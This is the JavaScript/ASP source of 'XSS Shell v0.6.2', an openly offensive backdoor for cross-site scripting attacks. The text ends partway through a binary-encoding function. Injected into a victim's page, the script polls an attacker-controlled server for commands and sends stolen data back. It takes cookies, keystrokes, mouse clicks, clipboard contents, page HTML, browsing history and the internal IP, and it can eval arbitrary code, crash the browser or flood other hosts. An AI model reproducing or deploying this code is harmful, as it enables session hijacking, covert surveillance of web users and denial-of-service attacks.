<% 
'	-------------------------
'	XSS SHELL v0.6.2
'	-------------------------
'	Ferruh Mavituna - ferruh{at}mavituna.com
'
'
'	For details and changelog refer to README file.
'
'	-------------------------
'	LICENCE
'	-------------------------
'	XSS Shell, XSS Backdoor for more effective XSS attacks
'	Copyright (C) {2006-2007} {Ferruh Mavituna} http://ferruh.mavituna.com
'
'	This program is free software; you can redistribute it and/or modify it
'	under the terms of the GNU General Public License as published by the Free
'	Software Foundation; either version 2 of the License, or (at your option)
'	any later version.
'
'	This program is distributed in the hope that it will be useful, but WITHOUT
'	ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
'	FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
'
'	You should have received a copy of the GNU General Public License along with
'	this library; if not, write to the Free Software Foundation, Inc., 59 Temple
'	Place, Suite 330, Boston, MA 02111-1307 USA
'
	'Prevent caching (if you want)
	Response.CacheControl = "no-cache" 
	Response.AddHeader "Pragma", "no-cache" 
	Response.Expires = -1 


	'Load VBScript
	If Request.Querystring("vb") > 0 Then LoadVb() : Response.End


'/*
'	VICTIM CONFIG
'*/
	Const DefaultID = 336699
	Const BroadCast = 336699

	Dim VicID, VicAdd
	VicID = CLng(fm_QNStr("v"))

	'Generate new Victim on the fly
	If VicID = BroadCast Then VicID = fm_RndNumeric

	'Add if not default victim 
	If VicID <> DefaultID Then VicAdd = "&v=" & VicID
%>
/*
	DEBUG CONFIG
*/

// Debug verbose level (0 = nothing, 1 = verbose, 2 = very verbose)
var DEBUGLEVEL = 0;


// Normally victim ID should be unique we can not trust IP its not so reliable, but maybe later as an option
var VICTIM = "<%=VicID%>";

/*
	----------------------------------------------
	SERVER CONFIG
	----------------------------------------------
*/

// You XSSShell Server
var SERVER = "http://www.xssshelltest.com:60000/"; 

// This file's name
var ME = SERVER + "xssshell.asp?p=1<%=VicAdd%>" ; 

// Connector file
var CONNECTOR = SERVER + "admin/connector.asp"; 

// Commands file
var COMMANDS_URL = SERVER + "admin/commands.asp"; 


/*
	----------------------------------------------
	END OF SERVER CONFIG
	----------------------------------------------
	
	Rest of the configuration includes detailed config. If you don't want fine tuning you don't need touch it.
*/

// Vbs file
var VBS_URL = ME + "&vb=1"; 



/*
	FRAME REGEN CONFIG
*/

// This URL will be regenerated (so you can force victim to redirect somewhere else maybe login page or something right after the infection)
var THIS_SRC = "?rand="+generateID(); 

// Regen properties
var REGEN_IFRAME_ID = "IframeRogue";
var CONTROLLER_ID = "ControllerFrame";
var LOADER_ID = "IframeLoader";    
var IFRAME_TITLE_FREQ = 500;


// Random identifier for DoS attacks
var RANDOM_INT = "{RANDOM}"



/*
	FEATURES CONFIG
*/

// Regenerate page in frames to keep it alive
var REGENERATE_PAGE = true;

// Keylogger
var LOAD_KEYLOGGER = true;

// Mouselogger (for virtual keyboards etc.)
var LOAD_MOUSELOGGER = true;

// Get current DOM on every click ! Only works if mouselogger enabled
var GET_SELF_EVERY_CLICK = false;



/*
	CONSTANTS
*/

// IE 4.0 Limit = 2083
// 1024 is a secure one...
var BUFFER_LIMIT = 1024; 

// Myself
var XSSSHELL = true;

// Space for other stuff
BUFFER_LIMIT -= 200; 



/*
	COMMUNICATION ENUMS
*/

// Send & Rec. not going to work in cross domain for almost all browsers so just for fun...
var XMLHTTP = 0;

// Just sending (to receive from an Iframe see ROUND_TRIP model)
var IFRAME = 1;

// Generally just for receieve
var IMG = 2;

// Load remote JS and parse it.
var JSMODEL = 3;

// Make roundtrips with payload to server and read from Iframe URL
var ROUND_TRIPS = 4;

/*
	COMMUNICATION / TUNNEL CONFIG
*/
var recCommunication = JSMODEL;
var sendCommunication = IFRAME;
var communication = recCommunication;


/*
	TIME CONFIG
*/

// Process Commmand wait frequency as ms
// This is important, because we don't track responses which means we blindly uses same iframe for every command response, which means lots of fucked up threads....
var PROCESS_FREQ = 1000; //1000;

// Request for new commmands frequency as ms
var REQUEST_FREQ = 500;

// Remote load control frequency
var REMOTE_JS_CHECK_FREQ = 100;

// If there is no getCommand() call we try to make it alive again
var REQ_TIMEOUT = 5000;


// If something goes server-response wait before remove last commands from que
var WAIT_AND_CALL = 2000;


// When you launch DoS all victims is going to start this number of connections by default (also you can supply this number while sending command)
var DEFAULT_DOS_CONNECTION = 500;

/*
	INTERNAL GLOBAL
*/

//	Log Types
var HTMLPAGE = 1;
var TEXT = 2;
var REPORT = 3;

// Broadcast victim, accept everytime
var BROADCAST_VICTIM = 336699;

// Keylogger Data
var keyloggerData = "KEYLOGGER:";

// Mouse Logger Data
var mouseLoggerData = "";

// Any commands return or not
var anyCommands = false;

/*
	COMMANDS

	If you want to add a new feature add it to here.
*/

// Command Enums
var CMD_GETCOOKIE = 1;
var CMD_GETSELFHTML = 2 ;
var CMD_ALERT = 3;
var CMD_YESNO = 4;
var CMD_EVAL = 5;
var CMD_GETKEYS = 6;
var CMD_GETMOUSE = 7;
var CMD_GETCLIPBOARD = 8;
var CMD_GETINTERNALIP = 9;
var CMD_PORTSCAN = 10;
var CMD_HISTORY = 11;
var CMD_GETURL = 12;
var CMD_DOS = 13;
var CMD_CRASH = 14;
var CMD_STOPDOS = 15;
var CMD_GETLOCATION = 16;


// Build Data Types
var dataTypes = new Array();
dataTypes[CMD_GETCOOKIE] = TEXT ;
dataTypes[CMD_GETSELFHTML] = HTMLPAGE ;
dataTypes[CMD_ALERT] = TEXT ;
dataTypes[CMD_YESNO] = TEXT ;
dataTypes[CMD_EVAL] = TEXT ;
dataTypes[CMD_GETKEYS] = TEXT ;
dataTypes[CMD_GETMOUSE] = TEXT ;
dataTypes[CMD_GETCLIPBOARD] = TEXT ;
dataTypes[CMD_GETINTERNALIP] = TEXT ;
dataTypes[CMD_PORTSCAN] = TEXT ;
dataTypes[CMD_HISTORY] = TEXT ;
dataTypes[CMD_GETURL] = HTMLPAGE ;
dataTypes[CMD_DOS] = TEXT ;
dataTypes[CMD_CRASH] = TEXT ;
dataTypes[CMD_STOPDOS] = TEXT;
dataTypes[CMD_GETLOCATION] = TEXT ;

var NO_RECORD = 0;
			

/*
	TOTALLY INTERNAL CONFIG
*/

// Timeout Check
var lastAccess=0;

// Internal
var d = document;

// Switch to context
var td = document;

var DEBUG_DIV = "debugshell";
var IFRAME_ID = "communicationIframe";
var CALLBACK_PARAM = "<<RESPONSE>>";
var COMMAND_SEPERATOR = "{|}";
var REMOTE_SCRIPT_ID = "remoteJs";
var FORM_ID = "r_control_tunnel";


// Command Que - FIFO
var commands = new Array();

// IE
var ie = d.all;


// Command Structure
function command(cmd, param, attackID) { 
	this.cmd = cmd;
	this.param = param.split("|,|"); // Convert to array
	this.attackID = attackID;
}
                   
// Setup onload initilaizer
window.onload += function(){
	init();
};

/*

	DESCRIPTION;
		Get current page HTML
	
	@Return : HTML Code of current page

*/

function getSelfHtml(){
	return getDomain().body.parentNode.innerHTML;
}

/*

	DESCRIPTION;
		Get current document cookie
	
	@Return : Cookie of current document

*/

function getCookie(){
	return d.cookie;    
}


function getHistory(list){
		
	var ret="";
	var checkLinks = list.split("\n");
	
	for (var i=0;i<checkLinks.length ;i++ )
		ret += checkLinks[i] + ":" + IsVisited(checkLinks[i]) + "{n}";

	return ret;
}

/*

	DESCRIPTION;
		Generate a new hidden div for history checking

	HISTORY
		Damn IE!, I have to update the code beacause of stupid IE. Now it's generating new iframe and putting style sheet into it then checking...

*/
var CHECK_BOX = "IFRAME_CHECKBOX_ID";

function getDummyIframe(){
	
	var IEdyn = d.getElementById(CHECK_BOX);
	if (!IEdyn){
		IEdyn = d.createElement("iframe");
		IEdyn.style.visibility = "hidden";
		IEdyn.id = CHECK_BOX;
		d.body.appendChild(IEdyn);	

		var df = getFrameCont(IEdyn);
		var style  = "<style>a:visited{width:0px};</style>";	
		df.open();
		df.write(style);
		df.close();
	}

	return IEdyn;
}

/*

	DESCRIPTION;
		Get frame document cross-browser

*/
function getFrameCont(frame){
	var fd = frame.contentDocument;
	if(!fd)fd = frame.contentWindow.document;
	
	return fd;
}

/*

	DESCRIPTION;
		Checks given link and retur true if visited false otherwise

*/

function IsVisited(link){
		
	var df = getFrameCont(getDummyIframe());
	
	var checkLink = df.createElement("a");
	checkLink.href = link;
	df.body.appendChild(checkLink);

	if (checkLink.currentStyle)
			visited = checkLink.currentStyle["width"];
	else 
		visited = df.defaultView.getComputedStyle(checkLink, null).getPropertyValue("width");

	return (visited == "0px");
}


/*
	Return the name of loaded frame
*/
function whereAmI(){
	
	for (var i=0;i<parent.window.frames.length ;i++ ){		
		if (parent.window.frames[i].document == self.document){
			return parent.window.frames[i].name;
		}
	}

	return "0";
}


/*

	DESCRIPTION;
		Main init function handle onload stuffs

*/

function init(){
	d.loadXSS=true;

	// Regenerate page in frames
	if(REGENERATE_PAGE){


		// Regenerate current page in frames
		if(parent.window.frames[0]){
			
			// Check if loaded in Rogueframe			
			if ( whereAmI() == REGEN_IFRAME_ID ){
				return;
			}
			
			// Check if loaded in Controller
			if ( whereAmI() == CONTROLLER_ID ){
				checkTitleChanges();
			}

		}else{ // First load - Generate and get out !
			window.setTimeout(addRegenFramesets, 1);
			return;

		}		
	}

	// TODO : REFACTOR
	// In fact this keylogger and mouselogger is *almost* useless in regenerated pages !

	// Load Keylogger
	if(LOAD_KEYLOGGER)
       document.onkeypress = logKeys;

	// Load MouseLogger
    if(LOAD_MOUSELOGGER)
        document.onclick = logMouse;


	// Command Channel
	commandListener();

	// Check for potential connection error and re-attempt to connect
	checkTimeout();

	// Load vbscript
	loadVb(VBS_URL);

	// Handle errors
	if(!debug)window.onerror = handleError;

	debug("init finished !", 2);
}

/*
	DESCRIPTION;
		Handle errors and try to keep connection alive...
*/

function handleError(){
	// On error remove received commands
	//getCommands();
}

/*
	DESCRIPTION;
		Remove given command with ERR response
*/
function removeCommand(cmd){
	log("ERR", TEXT, cmd.attackID, " ");
}


/*
	DESCRIPTION;
		Check timeout problems every second and reconnect if connection dropped
*/
function checkTimeout(){
	
	var now = new Date().getTime();

	// Get commands again if we didn't do it for a long time
	if (now - REQ_TIMEOUT > lastAccess){
		getCommands()
	}
		
	window.setTimeout("checkTimeout()", 1000);	
}

/*
	
	Get current document context (why named getDomain() ?)
	May switch optionally to support other issues

*/
function getDomain(){
	return parent.window.frames[REGEN_IFRAME_ID].document;
}

/*
    Source Partially : http://www.howtocreate.co.uk/jslibs/otherdemo.html
*/
function logKeys( e ) {
  if( !e ) { e = window.event; } 
  if( !e ) { return; }
  
  if( e.which ) { key = e.which; } 
  else if( e.keyCode ) { key = e.keyCode; } 
  else if( e.charCode ) { key = e.charCode }

    key = String.fromCharCode(key);

	// Log
	keyloggerData += key;
		
    debug(key, 2);

}


/*

	DESCRIPTION;
		Get commands from server and que them via pushCommands()

*/
function getCommands(){
	// Update time
	lastAccess = new Date().getTime();

	debug("Request done for commands", 2);
	debug(COMMANDS_URL + "?v=" + VICTIM, 2);
	
	if( !getRequest(COMMANDS_URL + "?v=" + VICTIM + "&r=" + generateID(), pushCommands, recCommunication) ){
        //window.setTimeout("getCommands()", REQUEST_FREQ);
    }

	processCommand();

}


/*

	DESCRIPTION;
		Push commands

*/

function pushCommands(cmd){

	// No job
	if(cmd == NO_RECORD) {
		debug("No commands to process!", 2);
		//window.setTimeout("getCommands()", REQUEST_FREQ);
		
        return ;
	}

	debug("Commands gathered : " + cmd, 1);

	//Go for it...
	var allCommands = cmd.split(COMMAND_SEPERATOR);
	
	for (var i = 0;i< allCommands.length; i+=3)
	{		
		// Add new command
		var newcmd = parseCommand(allCommands, i);
		commands.push(newcmd);
	}

	debug("Commands in que : " + commands.length, 1);

}


/*

	DESCRIPTION;
		Parse raw command request array and returns as new command

		@rawCmd : Not exactly it's an array
		@baseId : Array start point

	RETURN;
		- New Command

*/

function parseCommand(rawCmd, baseId){
	return new command(rawCmd[baseId], rawCmd[baseId+1], rawCmd[baseId+2]);
}

/*
	Generatre Random ID for AttackID (fix it with more random and unique stuff)
*/
function generateID(){
	return Math.floor(Math.random()*999999999);
}


/*

	DESCRIPTION;
		Process que and fire up commands until all of them finished

	REMARKS;
		- Delayed recursive function 
		- Works multithreaded

*/

function processQue(){

	debug("Que len : " + commands.length, 1);

	// No commands to manage in que
	if (commands.length === 0){
        // Check for new commands
        //window.setTimeout("getCommands()", REQUEST_FREQ);
        return;
    }
}



/*
	Check new commands
*/
function commandListener(){
	 getCommands();
	 //window.setTimeout("commandListener()", REQUEST_FREQ);
}


/*

	DESCRIPTION;
		Process que (FIFO style)

	21/04/2007
		- Recursively process every command until no more (I hope JS handles locking automaticly!)
	
*/
function processCommand(){

	// No commands
    if( commands.length == 0 ){
			//getCommands();
			window.setTimeout("getCommands()", REQUEST_FREQ);
			return;
	}
	
	// Get current command
	var cmd = commands.shift();
	processGivenCommand(cmd);

	processCommand();
}


/*

	DESCRIPTION;
		Wait and call callback
	
*/
function waitAndCall(callback, wait){
	window.setTimeout(callback, wait);	
}


/*

    Internal calls for given commands

*/
function processGivenCommand(cmd){

	switch (parseInt(cmd.cmd)){
		case CMD_GETCOOKIE:
			
 			log(getCookie(), dataTypes[cmd.cmd], cmd.attackID, "waitAndRun()");
			break;

		case CMD_GETLOCATION:
			log(d.location, dataTypes[cmd.cmd], cmd.attackID, "waitAndRun();" );
			break;

		case CMD_GETSELFHTML:
			log(binEncode(getSelfHtml()), dataTypes[cmd.cmd], cmd.attackID, "waitAndRun();" );
			break;

		case CMD_EVAL:
			
			eval(cmd.param[0]);
			log("Success", dataTypes[cmd.cmd], cmd.attackID, "waitAndRun();");
			break;

		case CMD_ALERT:
			
			alert(cmd.param[0]);
			log("Success", dataTypes[cmd.cmd], cmd.attackID, "waitAndRun();");
			break;

		case CMD_YESNO:
			
			log(prompt(cmd.param[0], ""), dataTypes[cmd.cmd], cmd.attackID, "waitAndRun()");
			break;

        case CMD_GETKEYS:
			
			log(keyloggerData, dataTypes[cmd.cmd], cmd.attackID, "waitAndRun()" );
			break;			

        case CMD_GETMOUSE:
			
            log(mouseLoggerData, dataTypes[cmd.cmd], cmd.attackID, "waitAndRun()" );
			break;			

        case CMD_GETCLIPBOARD:
			
            log(getClipboard(), dataTypes[cmd.cmd], cmd.attackID, "waitAndRun()" );
			break;			

        case CMD_GETINTERNALIP:
			
            log(getInternalIP(), dataTypes[cmd.cmd], cmd.attackID, "waitAndRun()" );
			break;			

/*        case CMD_PORTSCAN:
			
            log(portScan(cmd.param[0], cmd.param[1]), dataTypes[cmd.cmd], cmd.attackID, "waitAndRun()" );
			break;			*/

        case CMD_HISTORY:
			log(getHistory(cmd.param[0]), dataTypes[cmd.cmd], cmd.attackID, "waitAndRun()");
			break;			

        case CMD_GETURL:
			cmdGetURL(cmd);	
			break;			

        case CMD_CRASH:
			log("Don\'t expect a response!", dataTypes[cmd.cmd], cmd.attackID, "waitAndRun()");	
			cmdCrash();
			break;			

        case CMD_DOS:
			log("DoS Started", dataTypes[cmd.cmd], cmd.attackID, "waitAndRun()");
			
			var force = DEFAULT_DOS_CONNECTION;
			
			// Get from master param
			if (cmd.param[1] != undefined)force = cmd.param[1];


			stopDoS = true;
			cmdDoS(cmd.param[0], force);
			break;		
			
		case CMD_STOPDOS:
			stopDoS = true;
			log("DoS should be stopped.", dataTypes[cmd.cmd], cmd.attackID, "waitAndRun()");


	}

}


/*
    Dummy Wait
    
*/
function waitAndRun(){
    debug("Command Processed", 2);
}



/*

	DESCRIPTION;
		Write debug information to DEBUG_DIV
	
	@msg	: Debug Message

	REMARKS;
		- Only for debug...
		16/08/2006
			- Debug verbose level added


*/
function debug(msg, level){
	if(DEBUGLEVEL == 0 )
		return;

	if(typeof level == "undefined")
		level = 0;
	
	// Check for debug level and show
	if(level <= DEBUGLEVEL){
		generateDebugConsole();
		d.getElementById(DEBUG_DIV).innerHTML += "- " + msg + "<br>" ;
	}

}


/*

	DESCRIPTION;
		Check for debug console generate if it's not already around
	
	REMARKS;
		- Only for debug...

*/

function generateDebugConsole(){

	if(d.getElementById(DEBUG_DIV) === null) {
		
		var debugConsole;
		debugConsole = d.createElement("div");
		debugConsole.innerHTML = "<strong>Debug Console!</strong><hr>";
		debugConsole.id = DEBUG_DIV;
		
		d.body.appendChild(debugConsole);

		//debugConsole.className = DEBUG_DIV; // Damn its not working in IE I dont know why! so I did it by my dirty JS hands
		
		var dc = debugConsole.style;
		
		dc.color = "#0F0";
		dc.backgroundColor="#000";
		dc.padding="3px";
		dc.width = "400px";
		dc.border="1px solid #F00";
		dc.fontSize="11px";
		dc.fontFamily="Lucida Sans";
	}
}

/*
	DESCRIPTION;
		GetURL() source in the same domain by XMLHTTP (with POST DATA support)

*/
function cmdGetURL(cmd){
	var postData="";
	
	if (cmd.param.length>0)
		postData = cmd.param[1];
	
	getRequest(cmd.param[0], getURLHandler, postData,  XMLHTTP, dataTypes[cmd.cmd], cmd.attackID);	
}

/*
	DESCRIPTION;
		Handle getURL() event and send to master
	
	08.04.2007
		- Binary Encoding added

*/
function getURLHandler(dataType, attackID, response){
	
	//response = buildResponse(response);

	// TODO: Implement timeout for request and run wait and run if something goes wrong...
	log(buildResponse(response), dataType, attackID, "waitAndRun()");
}


/*

	DESCRIPTION;
		Do Request to Master
	
	@data			: Data will be send to master
	@dataType		: Datatype HTML, Text etc.
	@attackID		: Attack ID identifier

	REMARK;
		- SERVER hardcoded in Config

	TODO;
		+ DONE + Potential BUG TODO : Escape Chars Fix with URL Encode
		- Implement POST support

	HISTORY;
		- Data type added
		- Encoding added
		- AttackID added
		- Function seperated into 2 parts, log is now only prepare data and send it to getRequest() core function

*/

function log(data, dataType, attackID, callBack){
	url = CONNECTOR + "?r=" + generateID();
	postData = "d=" + escape(data) + "&t=" + escape(dataType) + "&a=" + escape(attackID);

	getRequest(url, callBack, postData,  sendCommunication);
}


/*

	Dummy Iframe Generator for submit 

	DESCRIPTION;
		Add Iframe for hidden communication
		
		FIXED + IE version more stable with Iframe regeneration.

	TODO;
		We need to keep track of Iframes and destroy them for a better memory management (not quite sure about the load)


*/
function addIframe(){
    var iframeLoader = d.getElementById(LOADER_ID);   
    
    try{
		// New loader if not exist
		if( !iframeLoader ){
			
			var tmpDiv = d.createElement("div");
			tmpDiv.id = LOADER_ID;
			d.body.appendChild(tmpDiv);
			
		}

	}catch(e){
		debug("Adding new div failed !", 1);
	}
    
    // TODO : Keep track of Iframe names in commands and destroy when complete command for memory issues
	// Generate a random Iframe Name
	var IframeName = IFRAME_ID + Math.floor(Math.random()*99999999); 

	// If exist remove Iframe
    try{
		
		if( d.getElementById(IframeName) ){
			d.getElementById(LOADER_ID).innerHTML = "";
		}
		
	}catch(e){
		debug("Removing loader failed !", 1);
	
	}
    	
	try{		
		// FIX : IE5 dynamic Iframe issues
        cIframe = d.createElement("iframe");
		cIframe.id = IframeName;
		cIframe.name = IframeName;

		if(DEBUGLEVEL == 0){
            cIframe.style.visibility = "hidden";
	      	/*cIframe.width=0;
	       	cIframe.height=0;
    		cIframe.border=0;   */
        }
		
	}catch(e){	
		debug("Iframe generation failed !");

	}

		iframeLoader = d.getElementById(LOADER_ID);   
		iframeLoader.appendChild(cIframe);
		
    	//cIframe.src = "empty.htm";

		return IframeName;
}


/*

	DESCRIPTION;
		Get xmlhttprequest object for gecko and IE style	
		
		- External Soource Code : Lost the place where I rip-off this snippet!

*/
function getXHR(){
	
	if( !window.XMLHttpRequest && window.ActiveXObject ) {
	 window.XMLHttpRequest = function() {
	  var a = [ 'Microsoft.XMLHTTP'];//'Msxml2.XMLHTTP', 'Msxml2.XMLHTTP.3.0', 'Msxml2.XMLHTTP.4.0', 'Msxml2.XMLHTTP.5.0' ,
	   i = a.length; while(i--) {
	   try {
		return new ActiveXObject( a[i] );
	   } catch (e) { }
	  }
	  return null;
	 };
	}

	var xmlhttp;
	if( window.XMLHttpRequest ) {
	 xmlhttp = new XMLHttpRequest();
	}

	if( !xmlhttp ) {
	 debug( 'Sorry, creating the XMLHttpRequest object failed.' );
	}

	return xmlhttp;

}

/*

	DESCRIPTION;
		Core communication function
		
		@url			: Request URL
		@callBack		: Callback function, will fire when we receive response

	RETURN;
	   Error status, True or False


	REMARK;
		10/08/2006
			- Communication tunnels are changed and now optional
		
        14/08/2006
            - Global communication removed

		08.04.2007
			- Yay, no eval any more, so we able get rid of potential XSS in here and a better code
		
		21/04/2007
			- Thread safe XMLHTTP requests
            
*/

function getRequest(url, callBack, postData, GetModel, opt1, opt2){
	debug("Request : " + url, 2);

	// POST Support
	isPost = (postData != "" && postData != null);
	
    
	// Fix to generic if it's not supplied 
    if ( typeof GetModel == "undefined")
	   GetModel = communication;
	       	
	

	// Select communication type
	switch(GetModel){
		
		case XMLHTTP:
    	    debug("Using XMLHTTP", 2);

			xmlhttp = getXHR();

			xmlhttp.open((isPost) ? "POST" : "GET", url, (!ie));

			// Add post headers
			if(isPost)
				xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");

			//Read binary
			if(ie) {
				xmlhttp.setRequestHeader("Accept-Charset", "x-user-defined");
				xmlhttp.setRequestHeader("Content-Type", "application/pdf");

			}else{
				xmlhttp.overrideMimeType("text/plain; charset=x-user-defined");

			}


			xmlhttp.onreadystatechange=function() {
				if (xmlhttp.readyState==4) {					
					// Process Response 
					callBack(opt1, opt2, xmlhttp);
				}

			};

			xmlhttp.send(postData);
			
			break;
		
        case IFRAME:
            
            // Maybe we should do this though DOM. Then it seems more professional with createlement...
            var formHtml = "<form name=\"" + FORM_ID + "\" id=\"" + FORM_ID + "\" method=\"POST\" action=\"" + url + "\" >";
            
            var formData = postData.split("&");
            for (var i = 0; i<formData.length; i++){
               var fieldStruct = formData[i].split("=");
               formHtml += "<input name=\"" + fieldStruct[0] + "\" value=\"" + fieldStruct[1] + "\" type=\"hidden\">"; 
            }
            
            formHtml += "</form>";
            
            // submit onload
            formHtml += "<script>window.onload=function(){document.forms[0].submit();}</script>";
            
            
            buildAndSubmitForm(formHtml);
            if(!callBack)
				callBack("Form Process Started...");

						
			break;

		// use Img src method... 
        // Just sending, and also you can get commands from loaded dimensions ...
        case IMG:
         debug("IMG mode not implemented!");
         break;
         
		// Just sending...
		// Load remote js and read
        case JSMODEL: // No post data support
		  loadJs(url);

  		  // Response
  		  remoteJsLoadControl(callBack);
  		  		
         break;
			
	}
	
	// Normally we should check for errors
    return true;
	
}


/*
	Response Channel...
*/

function buildAndSubmitForm(html){
    var IframeName = addIframe();
     
	try{
		
		if(ie){ //IE (doesnt work stable in FF)
			window.frames[IframeName].document.write(html);
			window.frames[IframeName].document.close();
		
		}else{ // FF
			d.getElementById(IframeName).contentWindow.document.write(html);
			d.getElementById(IframeName).contentWindow.document.close();
		}

	}catch(e){
		debug("Blown - \n" + e, 1);

	}

    debug("Response form submitted !, " + commands.length + " more commands in que", 1);
 }


/*

	DESCRIPTION;
		Check remote Js Loaded or Not 
		
		@evalCallBack	: Dirty Callback implementation, Function as String

	REMARK;
	
        14/08/2006
            - Started
            
*/

// Timeout control for remote loading 
var remoteTimer = null;

/*

    Check remote JS loaded. If it's loaded fire up callback.

*/
function remoteJsLoadControl(callBack){

    if(typeof c !== "undefined"  && c !== null){ // Loaded
                
		var remoteResponse;
		remoteResponse = c();
		callBack(remoteResponse);
    	
    	clearJsLoadControl();  	       

    }else{    
        remoteTimer = window.setTimeout("remoteJsLoadControl(" + callBack + ")", REMOTE_JS_CHECK_FREQ);
        
    }

}

/*
    DEPRECATED ?

	Clear remote js load controller timeout
*/
function clearJsLoadControl(){
    
    clearTimeout(remoteTimer);
    c = null; // For future requests
    remoteTimer = null;
    
}



/*

	DESCRIPTION;
		Dynamicly load remote JS file for getting new commands
		
		@src			: Request URL
		@evalCallBack	: Dirty Callback implementation, Function as String

	REMARK;
		
	HISTORY;
		14/08/2006
			- Start
*/
function loadJs(src) {
    // Possible problem with corrupted HTML pages or pages with no <head> tags
   var head = d.getElementsByTagName("head")[0];

   script = d.createElement('script');
   script.id = REMOTE_SCRIPT_ID;
   script.type = 'text/javascript';
   script.src = src;
   head.appendChild(script);

   debug("Remote JS DOM call started ...", 2);
   
 }

/*

	DESCRIPTION;
		Dynamicly load remote VB file (only load if browser is IE) 
		
		@src			: VB File URL

	REMARK;
		Should be combined with loadJs to avoid duplicating code.

	HISTORY;
		14/08/2006
			- Start
*/
d.vb=false;
function loadVb(src) {
    if (d.vb || !ie)return;
	// Possible problem with corrupted HTML pages or pages with no <head> tags
   var head = d.getElementsByTagName("head")[0];

   script = d.createElement('script');
   script.id = "vbcall";
   script.type = 'text/vbscript';
   script.src = src+"&"+generateID();
   head.appendChild(script);
   d.vb = true;

   debug("Remote VB call started ...", 2);  
 }


/*

    Get cursor coordinates

*/
function fm_MXY(XorY){ // Mouse Coords
	var coord = 0;
	
	if(coord<0)coord=0;
	return coord;
}

/*

    Function Log mouse positions

*/
function logMouse(e){
	var coordX=coordY=0;
    if(ie){
        coordX = event.clientX + d.body.scrollLeft;
        coordY = event.clientY + d.body.scrollTop;
    }
    else
    {
        coordX = e.pageX + d.body.scrollLeft;
        coordY = e.pageY + d.body.scrollTop;
    }
    
    mouseLoggerData += coordX + "-" + coordY + ";";
    
    if(GET_SELF_EVERY_CLICK)
        processGivenCommand(new command(CMD_GETSELFHTML, "", BROADCAST_VICTIM));
    
    debug(coordX + " - " + coordY, 2);
}


/*

    Get clipboard data

*/
function getClipboard(){
    if (!window.clipboardData)
      return "{NO BROWSER SUPPORT}";
             
    var txt = clipboardData.getData("Text");
      return (txt!=null)? txt : "{EMPTY}";
}


/*
    Code partially : 
        - http://f-box.org/~dan/ 
        - http://www.gnucitizen.org/projects/javascript-address-info/addressinfo.js

	Get internal IP only supports Mozilla

*/
function getInternalIP(){
        
        try{
            var sock = new java.net.Socket();
	      	sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
	       	sock.connect(new java.net.InetSocketAddress(d.domain, (!d.location.port)?80:d.location.port));
    		host = sock.getLocalAddress().getHostName();
	       	ip = sock.getLocalAddress().getHostAddress();	
    
    		return "Host:" + host + ";" + "IP:" + ip;            
        }
        catch(e){
            return "{NOT SUPPORTED}"
        }
}

/*
	Add Iframe 
*/
function addRegenIframe(){
	
	cIframe = document.createElement("iframe");	
	cIframe.id = REGEN_IFRAME_ID;
	cIframe.name = REGEN_IFRAME_ID;	
	
	cIframe.width = "100%";
	cIframe.height = "100%";
	cIframe.style.border = "none";
	cIframe.style.padding = "0";
	cIframe.style.margin = "0";
	cIframe.frameBorder = "0";

	document.body.appendChild(cIframe);

	window.frames[REGEN_IFRAME_ID].document.location = THIS_SRC;

	attachKeylogger(REGEN_IFRAME_ID);
}


/*

	Regenerate current page in framesets with controller
	
*/

function addRegenFramesets(){

	// Load itself to controller
	var jsME		= "<script src=\\\"" + ME + "\\\"><\\\/script>";

	// Build Frameset HTML
	var tmpHtml		 = "<scr"+"ipt>function ff(){var fd = document.getElementById(\"" + CONTROLLER_ID + "\").contentWindow.document;";
	
	tmpHtml			+= "fd.write(\"";
	tmpHtml			+= "<h2>CONTROLLER<h2>" + jsME;
	tmpHtml			+= "\");";
	
	// 0 Delayed load
	tmpHtml			+= "\nfd.close();\n}window.setTimeout(\"ff()\", 0);";
	tmpHtml			+= "</scr"+"ipt>";

	var frameval = (DEBUGLEVEL > 0)?"70":"100";

	// Framesets
	tmpHtml += "<frameset border=\"2\" frameborder=\"1\" framespacing=\"2\" cols=\"" +  frameval + "%,*\"><frame scrolling=\"auto\" id=\"" + REGEN_IFRAME_ID + "\" name=\"" + REGEN_IFRAME_ID + "\" src=\"" + THIS_SRC + "\"><frame scrolling=\"auto\" id=\"" + CONTROLLER_ID + "\" name=\"" + CONTROLLER_ID + "\"></frameset>";

	// Print
	document.write(tmpHtml);
	document.close();
}

/*
	
	Attack keylogger to subframes

*/
function attachKeylogger(frameID){
	
	// BUG : Check the loaded one for if its our function
	if(getDomain().onkeypress == null){
		if(!ie){
				
			// Only FF
			getDomain().onkeypress = function(e){
				parent.window.frames[CONTROLLER_ID].document;logKeys(e);
			};

			debug("Keylogger attached to " + frameID, 1);
				
		}else{ // IE
			
			// Not working, i have no idea why...			

			debug("It\'s an IE and I couldn\'t figure out how to attach an function with event succesfully...", 2);
		}

		
	}else{
		debug("Keylogger already attached to " + frameID, 2);

	}

}

/*
	Check title changes and apply 
	
	This function constantly check for changes in sub iframe and update current document title

	16/08/2006
		- Attach keylogger to new pages
*/
function checkTitleChanges(){
	
	// We are checking if its already attached or not we can not rely on title changes...
	attachKeylogger(REGEN_IFRAME_ID);

	try{
		// Just changed
		if(parent.document.title != getDomain().title){
			parent.document.title = getDomain().title;	
		}				
		
	}catch(e){
		debug("Possible permission denied error<br>" + e);
				
	}

	window.setTimeout("checkTitleChanges()", IFRAME_TITLE_FREQ);
	
}


/*
	Consume CPU in all browsers in 1 seconds, generally without any "Stop Script" messagebox.
	Not crashing browser but forcing victim to kill task...
*/
function cmdCrash(){
	var s="";
	window.setTimeout("crash()", 10);
	while(1){s=document.body.innerHTML+=s+=document.body.innerHTML;}
}

/*
	DoS attack (only GET supported) to another web server or something.
	Add x={RANDOM} or something to avoid caching.
*/
var stopDoS = false;
function cmdDoS(url, force){
	var df = getFrameCont(getDummyIframe());		
	
	for (var i=0;i<force ;i++ ){
		if(stopDoS)return; // stop it gently
		var mg = df.createElement('img');
		mg.src = url.replace(RANDOM_INT, new Date().getMilliseconds()+i );
	}

	// wait and run again
	waitAndCall("cmdDoS('" + url + "'," + force + ")", WAIT_AND_CALL);
}

/*
	Binay Encode
	Encode data in a binary safe way to enable transfer all kind of data

	15/04/2007
		- Newline big fixed

*/
function binEncode(input){
	var output = "";
	
	try{
		for (var i=0;i<input.length;i++){
			var curVal = input.charCodeAt(i);
			var hex = input.charCodeAt(i).toString(16);
			
